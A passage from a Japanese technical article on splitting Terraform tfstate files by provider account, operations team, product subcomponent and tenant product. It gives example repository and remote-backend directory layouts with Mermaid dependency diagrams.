同じリポジトリの場合プロバイダーアカウント別にtfstateファイルを分割することは推奨としているため、その上でディレクトリ構成を考えます。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83D\uDC31 repository/├── \uD83D\uDCC2 aws/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # Tes環境のAWSリソースの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    └── \uD83D\uDCC2 prd/ # Prd環境│├── \uD83D\uDCC2 datadog/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── \uD83D\uDCC2 tes/│    │    ├── backend.tfvars # Tes環境のDatadogの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│├── \uD83D\uDCC2 healthchecks/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── \uD83D\uDCC2 tes/│    │    ├── backend.tfvars # Tes環境のHealthchecksの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│└── \uD83D\uDCC2 pagerduty/      ├── output.tf # 他の tfstate ファイルから依存される      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── provider.tf      ├── \uD83D\uDCC2 tes/      │    ├── backend.tfvars # Tes環境のPagerDutyの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/      └── \uD83D\uDCC2 prd/【実行環境別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合実行環境別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。例えば、前述の依存関係図の状況と仮定します。\uD83E\uDEA3 tes-aws-bucket/│└── terraform.tfstate # Tes環境のAWSリソースの状態を持つ\uD83E\uDEA3 tes-datadog-bucket/│└── terraform.tfstate # Tes環境のDatadogの状態を持つ\uD83E\uDEA3 tes-healthchecks-bucket/│└── terraform.tfstate # Tes環境のHealthchecksの状態を持つ\uD83E\uDEA3 tes-pagerduty-bucket/│└── terraform.tfstate # Tes環境のPagerDutyの状態を持つ▼ 同じリモートバックエンド x AWSアカウント別に異なる実行環境 の場合プロバイダーアカウント別に分割したtfstateファイルを、同じリモートバックエンドで管理します。また、AWSアカウント別に異なる実行環境を作成していると仮定します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 aws/│    └── terraform.tfstate # Tes環境のAWSリソースの状態を持つ│├── \uD83D\uDCC2 datadog/│    └── terraform.tfstate # Tes環境のDatadogの状態を持つ│├── \uD83D\uDCC2 healthchecks/│    └── terraform.tfstate # Tes環境のHealthchecksの状態を持つ│└── \uD83D\uDCC2 pagerduty/      └── terraform.tfstate # Tes環境のPagerDutyの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...▼ 同じリモートバックエンド x 単一のAWSアカウント内に全ての実行環境 の場合プロバイダーアカウント別に分割したtfstateファイルを、同じリモートバックエンドで管理します。また、単一のAWSアカウント内に全実行環境を作成しているとします。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。\uD83E\uDEA3 bucket/├── \uD83D\uDCC2 aws/│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    └── terraform.tfstate # Tes環境のAWSリソースの状態を持つ│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    └── \uD83D\uDCC2 prd/ # Prd環境│├── \uD83D\uDCC2 datadog/│    ├── \uD83D\uDCC2 tes/│    │    └── terraform.tfstate # Tes環境のDatadogの状態を持つ│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│├── \uD83D\uDCC2 healthchecks/│    ├── \uD83D\uDCC2 tes/│    │    └── terraform.tfstate # Tes環境のHealthchecksの状態を持つ│    ││    ├── \uD83D\uDCC2 stg/│    └── \uD83D\uDCC2 prd/│└── \uD83D\uDCC2 pagerduty/      ├── \uD83D\uDCC2 tes/      │    └── terraform.tfstate # Tes環境のPagerDutyの状態を持つ      │      ├── \uD83D\uDCC2 stg/      └── \uD83D\uDCC2 prd/09. 中間層の分割 (任意)中間層の分割について中間層の分割は 任意 です。Terraformに携わる管理者が多くなるほど、効力を発揮します。運用チーム責務範囲別 - ★★この分割方法について運用チーム (例：アプリチーム、インフラチーム) のAWSリソースの責務範囲別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各運用チームが互いに影響を受けずに、terraformコマンドの結果を得られるようになります。CloudFormation best practices - AWS CloudFormationTerraform in Action (English Edition)▶ おすすめ度について【チーム別】状態の依存関係図例えば、以下の運用チームに分割した状況と仮定します。frontendチーム (アプリのフロントエンド領域担当)backendチーム (アプリのバックエンド領域担当)sreチーム (インフラ領域担当)ここで仮定した状況では、各チームが管理する tfstate ファイル間で状態が相互に依存しているとします。AWSリソース間の相互依存ではないため、循環参照は起こりません。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 運用チーム責務範囲別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            frontend[\\"frontend-team-tfstate<br>(CloudFront, S3, など)\\"]            backend[\\"backend-team-tfstate<br>(API Gateway, ElastiCache, RDS, SES, SNS, など)\\"]            sre[\\"sre-team-tfstate<br>(ALB, CloudWatch, EC2, ECS, EKS, IAM, VPC, など)\\"]            frontend-..->sre            backend-..->sre            sre-..->frontend            sre-..->backend        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【チーム別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合この場合では、運用チーム責務範囲別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-frontend-team-repository/ # frontendチーム├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── cloudfront.tf├── s3.tf├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する      ...\uD83D\uDC31 aws-backend-team-repository/ # backendチーム├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── elasticache.tf├── ses.tf├── sns.tf├── rds.tf├── \uD83D\uDCC2 tes│    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg│    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd      ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する       ...\uD83D\uDC31 aws-sre-team-repository/ # sreチーム├── output.tf # 他の tfstate ファイルから依存される├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── alb.tf├── cloudwatch.tf├── ec2.tf├── ecs.tf├── eks.tf├── iam.tf├── vpc.tf├── \uD83D\uDCC2 tes│    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg│    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd      ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する      ...▼ 同じリポジトリの場合この場合では、運用チーム責務範囲別に分割したtfstateファイルを、異なるリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 frontend-team # frontendチーム│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudfront.tf│    ├── s3.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # frontendチームの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 backend-team # backendチーム│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── elasticache.tf│    ├── ses.tf│    ├── sns.tf│    ├── rds.tf│    ├── \uD83D\uDCC2 tes│    │    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg│    │    ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd│          ├── backend.tfvars # backendチームの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 sre-team # sreチーム      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── alb.tf      ├── cloudwatch.tf      ├── ec2.tf      ├── ecs.tf      ├── eks.tf      ├── iam.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes      │    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg      │    ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd           ├── backend.tfvars # sreチームの状態を持つ tfstate ファイルを指定する           ...【チーム別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合運用チーム責務範囲別の場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、プロバイダーアカウント別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 frontend-team│    └── terraform.tfstate # frontendチームの状態を持つ│├── \uD83D\uDCC2 backend-team│    └── terraform.tfstate # backendチームの状態を持つ│└── \uD83D\uDCC2 sre-team      └── terraform.tfstate # sreチームの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...プロダクトのサブコンポーネント別 - ★★この分割方法についてプロダクトのサブコンポーネント (例：アプリ、ネットワーク、認証/認可、監視など) 別でtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、サブコンポーネントの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。Things to Know Before Working With Terraform – Part 1 | EndavaTerraform organization — Part I : What if you split your components ? | by Amine Charot | Medium▶ おすすめ度についてterraform_remote_stateブロック地獄になっていくため、適切な数 (3〜5個くらい) にしておくように注意が必要です。この分割方法は、後述のAWSリソースの種類グループとごっちゃになってしまう場合があるため、プロダクトのサブコンポーネントとして意識的に分割させる必要があります\uD83D\uDC4D【サブコンポーネント別】状態の依存関係図例えば、以下のサブコンポーネントに分割した状況と仮定します。application (Web3層系)auth (認証/認可系)monitor (監視系)network (ネットワーク系)ここで仮定した状況では、各プロダクトの tfstate ファイルの依存は一方向最終的に、networkサブコンポーネントやauthサブコンポーネントの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: プロダクトのサブコンポーネント別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            application[\\"application-tfstate<br>Web3層と周辺AWSリソース<br>(ALB, APIGateway, CloudFront, EC2, ECS, EKS, RDS, S3, SNS, など)\\"]            auth[\\"auth-tfstate<br>(IAMなど)\\"]            monitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]            network[\\"network-tfstate<br>(Route53, VPC, など)\\"]            application-..->network            application-..->auth            monitor-..->application        end        subgraph stg-bucket            stg[\\"tfstate\\"]        end        subgraph prd-bucket            prd[\\"tfstate\\"]        end        end【サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合プロダクトのサブコンポーネント別の分割パターンの場合、異なるリポジトリで管理するとリポジトリが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリポジトリの場合この場合では、プロダクトのサブコンポーネント別に分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-repository/├── \uD83D\uDCC2 application/│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── provider.tf│    ├── alb.tf│    ├── cloudfront.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── ses.tf│    ├── sns.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # applicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 auth/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # authコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 monitor/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudwatch.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # monitorコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境           ├── backend.tfvars # networkコンポーネントの状態を持つ tfstate ファイルを指定する           ...【サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合プロダクトのサブコンポーネント別の分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、プロダクトのサブコンポーネント別に分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 application│    └── terraform.tfstate # applicationコンポーネントの状態を持つ│├── \uD83D\uDCC2 auth│    └── terraform.tfstate # authコンポーネントの状態を持つ│├── \uD83D\uDCC2 monitor│    └── terraform.tfstate # monitorコンポーネントの状態を持つ│└── \uD83D\uDCC2 network      └── terraform.tfstate # networkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...運用チーム責務範囲別 \xd7 プロダクトサブコンポーネント別 - ★この分割方法について運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせてtfstateファイルを分割し、中間層もこれに基づいて設計します。この分割方法により、各運用チーム内のサブコンポーネントの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度について【チーム別 \xd7 サブコンポーネント別】状態の依存関係図以下の運用チームに分割した状況と仮定します。また、各運用チームでTerraformを変更できる管理者が相当数するため、プロダクトのサブコンポーネント別にも分割したとします。frontendチームapplicationmonitorbackendチームapplicationmonitorsreチームapplicationauthmonitornetworkここで仮定した状況では、各プロダクトのtfstateファイルの依存は一方向最終的に、sreチームの管理する tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 運用チーム責務範囲別 \xd7 プロダクトサブコンポーネント別---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            subgraph frontend-team               frontendApplication[\\"application-tfstate<br>(CloudFront, S3, など)\\"]               frontendMonitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]            end            subgraph backend-team                backendApplication[\\"application-tfstate<br>(API Gateway, ElastiCache, RDS, SES, SNS, など)\\"]                backendMonitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]            end            subgraph sre-team                sreApplication[\\"application-tfstate<br>Web3層と周辺AWSリソース<br>(ALB, EC2, ECS, EKS, SNS, など)\\"]                auth[\\"auth-tfstate<br>(IAM, など)\\"]                sreMonitor[\\"monitor-tfstate<br>(CloudWatch, など)\\"]                network[\\"network-tfstate<br>(Route53, VPC, など)\\"]            end            frontendApplication-...->network            sreApplication-...->auth            sreApplication-...->network            backendApplication-...->auth            backendApplication-...->network            frontendMonitor-...->frontendApplication            sreMonitor-...->sreApplication            backendMonitor-...->backendApplication        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【チーム別 \xd7 サブコンポーネント別】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合この場合では、運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせて分割したtfstateファイルを、同じリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。\uD83D\uDC31 aws-frontend-team-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudfront.tf│    ├── ses.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # frontendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # frontendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # frontendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 monitor/      ├── provider.tf      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── cloudwatch.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # frontendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # frontendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境            ├── backend.tfvars # frontendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する            ...\uD83D\uDC31 aws-backend-team-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── api_gateway.tf│    ├── elasticache.tf│    ├── rds.tf│    ├── ses.tf│    ├── sns.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # backendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # backendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # backendチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 monitor/      ├── provider.tf      ├── remote_state.tf # terraform_remote_state ブロックを使用する      ├── cloudwatch.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # backendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # backendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境            ├── backend.tfvars # backendチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する            ...\uD83D\uDC31 aws-sre-team-repository/├── \uD83D\uDCC2 application/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── alb.tf│    ├── ec2.tf│    ├── ecs.tf│    ├── eks.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # sreチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # sreチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # sreチームが管理するapplicationコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 auth/│    ├── provider.tf│    ├── output.tf # 他の tfstate ファイルから依存される│    ├── iam.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # sreチームが管理するauthコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # sreチームが管理するauthコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # sreチームが管理するauthコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│├── \uD83D\uDCC2 monitor/│    ├── provider.tf│    ├── remote_state.tf # terraform_remote_state ブロックを使用する│    ├── cloudwatch.tf│    ├── \uD83D\uDCC2 tes/ # Tes環境│    │    ├── backend.tfvars # sreチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    ├── \uD83D\uDCC2 stg/ # Stg環境│    │    ├── backend.tfvars # sreチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する│    │    ...│    ││    └── \uD83D\uDCC2 prd/ # Prd環境│          ├── backend.tfvars # sreチームが管理するmonitorコンポーネントの状態を持つ tfstate ファイルを指定する│          ...│└── \uD83D\uDCC2 network      ├── provider.tf      ├── output.tf # 他の tfstate ファイルから依存される      ├── route53.tf      ├── vpc.tf      ├── \uD83D\uDCC2 tes/ # Tes環境      │    ├── backend.tfvars # sreチームが管理するnetworkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      ├── \uD83D\uDCC2 stg/ # Stg環境      │    ├── backend.tfvars # sreチームが管理するnetworkコンポーネントの状態を持つ tfstate ファイルを指定する      │    ...      │      └── \uD83D\uDCC2 prd/ # Prd環境            ├── backend.tfvars # sreチームが管理するnetworkコンポーネントの状態を持つ tfstate ファイルを指定する            ...▼ 同じリポジトリの場合運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせる分割パターンの場合、同じリポジトリで管理するとリポジトリが巨大になってしまいます。そのため、これはお勧めしません。【チーム別 \xd7 サブコンポーネント別】リモートバックエンドのディレクトリ構成▼ 異なるリモートバックエンドの場合運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせる分割パターンの場合、異なるリモートバックエンドで管理するとバックエンドが増え過ぎてしまいます。そのため、これはお勧めしません。▼ 同じリモートバックエンドの場合この場合では、運用チーム責務範囲別とプロダクトサブコンポーネント別を組み合わせて分割したtfstateファイルを、異なるリモートバックエンドで管理します。例えば、tfstateファイル分割に基づいて、リモートバックエンド内のディレクトリ構成例は以下の通りになります。この例では、状態の依存関係図と同じ状況を仮定しています。# Tes環境の状態のみを管理するバケット\uD83E\uDEA3 tes-bucket/├── \uD83D\uDCC2 frontend-team│    ├── \uD83D\uDCC2 application│    │    └── terraform.tfstate # frontendチームが管理するapplicationコンポーネントの状態を持つ│    ││    └── \uD83D\uDCC2 monitor│         └── terraform.tfstate # frontendチームが管理するmonitorコンポーネントの状態を持つ│├── \uD83D\uDCC2 backend-team│    ├── \uD83D\uDCC2 application│    │    └── terraform.tfstate # backendチームが管理するapplicationコンポーネントの状態を持つ│    ││    └── \uD83D\uDCC2 monitor│          └── terraform.tfstate # backendチームが管理するmonitorコンポーネントの状態を持つ│└── \uD83D\uDCC2 sre-team      ├── \uD83D\uDCC2 application      │    └── terraform.tfstate # sreチームが管理するapplicationコンポーネントの状態を持つ      │      ├── \uD83D\uDCC2 auth      │    └── terraform.tfstate # sreチームが管理するauthコンポーネントの状態を持つ      │      ├── \uD83D\uDCC2 monitor      │    └── terraform.tfstate # sreチームが管理するmonitorコンポーネントの状態を持つ      │      └── \uD83D\uDCC2 network            └── terraform.tfstate # sreチームが管理するnetworkコンポーネントの状態を持つ# Stg環境の状態のみを管理するバケット\uD83E\uDEA3 stg-bucket/│...# Prd環境の状態のみを管理するバケット\uD83E\uDEA3 prd-bucket/│...同じテナント内のプロダクト別この分割方法について同じテナント (例：同じAWSアカウントの同じVPC) 内に複数の小さなプロダクトがある場合、プロダクト別でtfstateファイルを分割し、中間層もこれに基づいて設計します。ここでいうプロダクトは、アプリを動かすプラットフォーム (例：EKS、ECS、AppRunner、EC2) とそれを取り巻くAWSリソースを指しています。この分割方法により、各プロダクトの管理者が互いに影響を受けずに、terraformコマンドの結果を得られるようになります。▶ おすすめ度について【同じテナント内のプロダクト】状態の依存関係図例えば、以下のプロダクトに分割した状況と仮定します。fooプロダクトbarプロダクト共有networkコンポーネント (例：VPC、Route53)ここで仮定した状況では、各プロダクトの tfstate ファイルの依存は一方向最終的に、共有networkコンポーネントの tfstate ファイルに依存しているとします。そのため、想定される状態の依存関係図は以下の通りになります。なお、依存方向は状況によって異なることをご容赦ください。---title: 同じテナント内のプロダクト---%%{init:{\'theme\':\'default\'}}%%flowchart TB    subgraph AWS        subgraph tes-bucket            foo-product[\\"foo-product-tfstate<br>(アプリを動かすプラットフォームのAWSリソース)\\"]-..->network            bar-product[\\"bar-product-tfstate<br>(アプリを動かすプラットフォームのAWSリソース)\\"]-..->network            network[\\"network-tfstate<br>(Route53, VPC)\\"]        end    subgraph stg-bucket        stg[\\"tfstate\\"]    end    subgraph prd-bucket        prd[\\"tfstate\\"]    end    end【同じテナント内のプロダクト】リポジトリのディレクトリ構成▼ 異なるリポジトリの場合この場合では、同じテナント内のプロダクトに分割したtfstateファイルを、異なるリポジトリで管理します。例えば、tfstateファイル分割に基づいて、リポジトリのディレクトリ構成例は以下の通りになります。前述の依存関係図の状況と仮定します。# fooプロダクトの tfstate ファイルのリポジトリ\uD83D\uDC31 aws-foo-product-repository/├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する│    ...│└── \uD83D\uDCC2 prd/ # Prd環境      ├── backend.tfvars # fooプロダクトの状態を持つ tfstate ファイルを指定する      ...# barプロダクトの tfstate ファイルのリポジトリ\uD83D\uDC31 aws-bar-product-repository/├── provider.tf├── remote_state.tf # terraform_remote_state ブロックを使用する├── \uD83D\uDCC2 tes/ # Tes環境│    ├── backend.tfvars # barプロダクトの状態を持つ tfstate ファイルを指定する│    ...│├── \uD83D\uDCC2 stg/ # Stg環境│    ├── 